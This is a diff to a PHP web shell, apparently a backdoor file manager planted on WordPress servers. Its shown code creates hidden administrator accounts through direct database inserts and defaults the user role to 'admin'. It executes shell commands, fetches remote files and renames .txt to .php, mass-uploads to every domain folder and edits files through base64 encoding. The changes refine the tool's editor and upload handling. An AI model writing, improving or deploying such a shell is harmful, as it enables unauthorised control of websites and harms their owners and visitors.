@@ -72,6 +72,7 @@ body::before { content: ''; position: absolute; top: -50%; left: -50%; width: 20
 </html>
 <?php exit; }
 
+// Get user role
 $user_role = $_SESSION['user_role'] ?? 'admin';
 $is_admin = ($user_role === 'admin');
 
@@ -249,11 +250,8 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action'])) {
                             } else {
                                 $pass_hash = md5($password); $now = date('Y-m-d H:i:s'); $user_nicename = sanitizeUserForDb($username);
                                 $ins = @mysqli_query($cn, "INSERT INTO {$pre}users (user_login, user_pass, user_nicename, user_email, user_url, user_registered, user_status, display_name) VALUES ('$username', '$pass_hash', '$user_nicename', '$email', '', '$now', 0, '$username')");
-                                if ($ins) {
-                                    $uid = mysqli_insert_id($cn); $cap = serialize(['administrator' => true]);
-                                    @mysqli_query($cn, "INSERT INTO {$pre}usermeta (user_id, meta_key, meta_value) VALUES ($uid, '{$pre}capabilities', '$cap')"); @mysqli_query($cn, "INSERT INTO {$pre}usermeta (user_id, meta_key, meta_value) VALUES ($uid, '{$pre}user_level', '10')");
-                                    $message = "✅ Admin user '$username' created successfully! Login at wp-admin."; $message_type = "success";
-                                } else { $message = "❌ Failed to insert user: " . mysqli_error($cn); $message_type = "error"; }
+                                if ($ins) { $uid = mysqli_insert_id($cn); $cap = serialize(['administrator' => true]); @mysqli_query($cn, "INSERT INTO {$pre}usermeta (user_id, meta_key, meta_value) VALUES ($uid, '{$pre}capabilities', '$cap')"); @mysqli_query($cn, "INSERT INTO {$pre}usermeta (user_id, meta_key, meta_value) VALUES ($uid, '{$pre}user_level', '10')"); $message = "✅ Admin user '$username' created successfully! Login at wp-admin."; $message_type = "success"; }
+                                else { $message = "❌ Failed to insert user: " . mysqli_error($cn); $message_type = "error"; }
                             }
                             mysqli_close($cn);
                         } else { $message = "❌ Database connection failed: " . mysqli_connect_error(); $message_type = "error"; }
@@ -321,7 +319,15 @@ foreach ($items as $item) { if ($item === '.') continue; if (is_dir($current_dir
 sort($directories); sort($files);
 
 $edit_mode = false; $edit_content_b64 = ''; $edit_filename = '';
-if (isset($_SESSION['edit_file'])) { $edit_filename = $_SESSION['edit_file']; $edit_path = $current_dir . '/' . $edit_filename; if (is_file($edit_path) && is_readable($edit_path)) { $edit_mode = true; $content = file_get_contents($edit_path); $edit_content_b64 = ($content !== false) ? base64_encode($content) : ''; } else { unset($_SESSION['edit_file']); } }
+if (isset($_SESSION['edit_file'])) {
+    $edit_filename = $_SESSION['edit_file'];
+    $edit_path = $current_dir . '/' . $edit_filename;
+    if (is_file($edit_path) && is_readable($edit_path)) {
+        $edit_mode = true;
+        $content = file_get_contents($edit_path);
+        $edit_content_b64 = ($content !== false) ? base64_encode($content) : '';
+    } else { unset($_SESSION['edit_file']); }
+}
 
 $scan_results = $_SESSION['scan_results'] ?? []; $scan_path_name = $_SESSION['scan_path'] ?? '';
 if (isset($_SESSION['scan_results'])) { unset($_SESSION['scan_results'], $_SESSION['scan_path']); }
@@ -467,6 +473,7 @@ textarea:focus { border-color: var(--border-accent); outline: none; box-shadow: 
     <div class="loading-text">Loading...</div>
 </div>
 
+<!-- HIDDEN FILE INPUTS FOR MOBILE UPLOAD -->
 <input type="file" id="sys-single-upload" style="display:none" onchange="apiSingleUpload(this.files[0])">
 <input type="file" id="sys-mass-upload" style="display:none" onchange="apiMassUpload(this.files[0])">
 
@@ -581,16 +588,23 @@ textarea:focus { border-color: var(--border-accent); outline: none; box-shadow: 
 </div>
 <?php endif; ?>
 
+<!-- FIXED EDITOR PANEL (BASE64 DECODER) -->
 <?php if ($edit_mode): ?>
 <div class="editor-panel">
     <div style="display:flex; justify-content:space-between; margin-bottom:10px; align-items:center;">
         <span style="font-weight: 600;"><i class="fas fa-code"></i> Edit: <strong><?= htmlspecialchars($edit_filename) ?></strong></span>
         <button class="top-btn" onclick="closeEditor()" style="background:var(--danger);color:white;width:auto;padding:0.45rem 0.9rem;"><i class="fas fa-times"></i></button>
     </div>
-    <form method="post">
+    <form method="post" id="edit-form">
         <input type="hidden" name="action" value="save_edit">
         <input type="hidden" name="target_file_b64" value="<?= base64_encode($edit_filename) ?>">
-        <textarea name="file_content_b64" rows="12"><?= htmlspecialchars($edit_content_b64) ?></textarea>
+        
+        <!-- Hidden Base64 Storage -->
+        <textarea name="file_content_b64" id="editor-b64" style="display:none;"><?= htmlspecialchars($edit_content_b64) ?></textarea>
+        
+        <!-- Visible Editor for User -->
+        <textarea id="editor-visible" rows="15" style="width: 100%; background: rgba(10, 14, 26, 0.8); border: 1px solid var(--border-subtle); color: #00ff88; font-family: 'JetBrains Mono', monospace; font-size: 0.85rem; padding: 1rem; border-radius: var(--radius-md); min-height: 300px; outline: none;"></textarea>
+        
         <div style="display:flex; gap:10px; margin-top:12px; justify-content:flex-end;">
             <button type="submit" class="top-btn" style="background:var(--accent-gradient);color:#fff;width:auto;padding:0.55rem 1.1rem;border:none;box-shadow: 0 4px 12px rgba(16, 185, 129, 0.3);"><i class="fas fa-save"></i> Save</button>
         </div>
@@ -646,19 +660,13 @@ textarea:focus { border-color: var(--border-accent); outline: none; box-shadow: 
 <div id="dropdownMenu" class="dropdown-menu"></div>
 
 <?php if ($is_admin): ?>
-<div id="uploadModal" class="modal"><div class="modal-card-generic"><h3><i class="fas fa-file-arrow-up"></i> Single Upload</h3><div style="background:var(--success-soft);border-left:3px solid var(--accent-primary);padding:10px 14px;border-radius:10px;font-size:0.78rem;color:var(--accent-primary);margin-bottom:12px;"><i class="fas fa-info-circle"></i> Upload 1 file to current folder: <code style="font-family: 'JetBrains Mono', monospace;"><?= htmlspecialchars($current_dir) ?></code></div><input type="file" id="uploadFile"><div class="modal-actions"><button onclick="uploadFile()" class="primary">Upload</button><button onclick="hideModal('uploadModal')">Cancel</button></div></div></div>
-
-<div id="massUploadModal" class="modal"><div class="modal-card-generic"><h3><i class="fas fa-layer-group"></i> Mass Upload</h3><div style="background:var(--danger-soft);border-left:3px solid var(--danger);padding:10px 14px;border-radius:10px;font-size:0.78rem;color:#f87171;margin-bottom:12px;"><i class="fas fa-info-circle"></i> File will be uploaded to <strong>ALL domain folders</strong> detected in this directory.</div><input type="file" id="massUploadFile"><div class="modal-actions"><button onclick="massUploadFile()" class="primary" style="background: linear-gradient(135deg, #f59e0b, #d97706);"><i class="fas fa-layer-group"></i> Mass Upload</button><button onclick="hideModal('massUploadModal')">Cancel</button></div></div></div>
-
+<!-- Admin Modals (Download, New, Cmd) -->
 <div id="curlModal" class="modal"><div class="modal-card-generic"><h3><i class="fas fa-cloud-download-alt"></i> Download URL</h3><div style="background:var(--success-soft);border-left:3px solid var(--accent-primary);padding:10px 14px;border-radius:10px;font-size:0.78rem;color:var(--accent-primary);margin-bottom:12px;"><i class="fas fa-info-circle"></i> File <code style="font-family: 'JetBrains Mono', monospace;">.txt</code> will be auto-converted to <code style="font-family: 'JetBrains Mono', monospace;">.php</code></div><input type="text" id="fetchUrl" placeholder="https://domain.com/file.txt"><input type="text" id="saveAs" placeholder="Save as (optional)"><div class="modal-actions"><button onclick="fetchUrl()" class="primary">Download</button><button onclick="hideModal('curlModal')">Cancel</button></div></div></div>
-
 <div id="newFolderModal" class="modal"><div class="modal-card-generic"><h3><i class="fas fa-folder-plus"></i> New Folder</h3><input type="text" id="folderName" placeholder="folder_name"><div class="modal-actions"><button onclick="createFolder()" class="primary">Create</button><button onclick="hideModal('newFolderModal')">Cancel</button></div></div></div>
-
 <div id="newFileModal" class="modal"><div class="modal-card-generic"><h3><i class="fas fa-file-medical"></i> New File</h3><input type="text" id="fileName" placeholder="file.txt"><div class="modal-actions"><button onclick="createFile()" class="primary">Create</button><button onclick="hideModal('newFileModal')">Cancel</button></div></div></div>
-
 <div id="cmdModal" class="modal"><div class="modal-card-generic"><h3><i class="fas fa-terminal"></i> Execute Command</h3><input type="text" id="commandInput" placeholder="ls -la" style="font-family:'JetBrains Mono',monospace;"><div class="modal-actions"><button onclick="runCommand()" class="primary">Execute</button><button onclick="hideModal('cmdModal')">Cancel</button></div></div></div>
 <?php else: ?>
-<!-- MODAL UPLOAD USER - TANPA INFO ROLE -->
+<!-- User Modal (Clean Upload) -->
 <div id="uploadModal" class="modal">
     <div class="modal-card-generic">
         <h3><i class="fas fa-file-arrow-up"></i> Upload File</h3>
@@ -676,6 +684,7 @@ function toBase64(str) { try { return btoa(unescape(encodeURIComponent(str))); }
 function showModal(id){document.getElementById(id).style.display='flex';}
 function hideModal(id){document.getElementById(id).style.display='none';}
 
+// FIXED UPLOAD DROPDOWN LOGIC
 function toggleUploadDropdown(event) { 
     event.stopPropagation(); 
     const btn = event.currentTarget;
@@ -704,6 +713,7 @@ function deleteItem(b64target){if(confirm('Delete permanently?')){var f=document
 function renameItem(b64old){var newname=prompt('New name:');if(newname){var f=document.createElement('form');f.method='POST';f.innerHTML='<input name="action" value="rename_b64"><input name="old_name_b64" value="'+b64old+'"><input name="new_name_b64" value="'+toBase64(newname)+'">';document.body.appendChild(f);f.submit();}}
 function chmodItem(b64target){var perms=prompt('Permission (e.g. 0755):','0755');if(perms){var f=document.createElement('form');f.method='POST';f.innerHTML='<input name="action" value="chmod_b64"><input name="target_b64" value="'+b64target+'"><input name="perms" value="'+perms+'">';document.body.appendChild(f);f.submit();}}
 
+// HIDDEN INPUT HANDLERS FOR UPLOAD
 function apiSingleUpload(file) {
     if (!file) return;
     const reader = new FileReader();
@@ -738,6 +748,7 @@ function apiMassUpload(file) {
     document.getElementById('sys-mass-upload').value = '';
 }
 
+// USER MODAL UPLOAD HANDLER
 function uploadFile(){
     var file=document.getElementById('uploadFile').files[0];
     if(!file){alert('Select a file');return;}
@@ -777,6 +788,34 @@ document.addEventListener('click', function(e) { var menu = document.getElementB
 function copyCommandOutput(){var pre=document.getElementById('cmdOutputText');var text=pre.innerText;if(navigator.clipboard&&navigator.clipboard.writeText){navigator.clipboard.writeText(text).then(function(){showCopyFeedback(true);}).catch(function(){fallbackCopy(text);});}else{fallbackCopy(text);}}
 function fallbackCopy(text){var textarea=document.createElement('textarea');textarea.value=text;document.body.appendChild(textarea);textarea.select();document.execCommand('copy');document.body.removeChild(textarea);showCopyFeedback(true);}
 function showCopyFeedback(success){var btn=document.querySelector('.copy-btn');if(success){btn.innerHTML='<i class="fas fa-check"></i> Copied!';setTimeout(function(){btn.innerHTML='<i class="fas fa-copy"></i> Copy';},1500);}else{btn.innerHTML='<i class="fas fa-times"></i> Failed';setTimeout(function(){btn.innerHTML='<i class="fas fa-copy"></i> Copy';},1500);}}
+
+// === EDITOR BASE64 DECODER/ENCODER FIX ===
+document.addEventListener('DOMContentLoaded', function() {
+    const b64Input = document.getElementById('editor-b64');
+    const visibleInput = document.getElementById('editor-visible');
+    const editForm = document.getElementById('edit-form');
+
+    // 1. Decode Base64 to readable text on load
+    if (b64Input && visibleInput && b64Input.value) {
+        try {
+            visibleInput.value = decodeURIComponent(escape(window.atob(b64Input.value)));
+        } catch (e) {
+            visibleInput.value = "⚠️ Error: Failed to decode file content.";
+        }
+    }
+
+    // 2. Encode text back to Base64 before submit
+    if (editForm && b64Input && visibleInput) {
+        editForm.addEventListener('submit', function(e) {
+            try {
+                b64Input.value = btoa(unescape(encodeURIComponent(visibleInput.value)));
+            } catch (err) {
+                e.preventDefault();
+                alert("❌ Failed to save: Unsupported characters in file.");
+            }
+        });
+    }
+});
 </script>
 </body>
 </html>
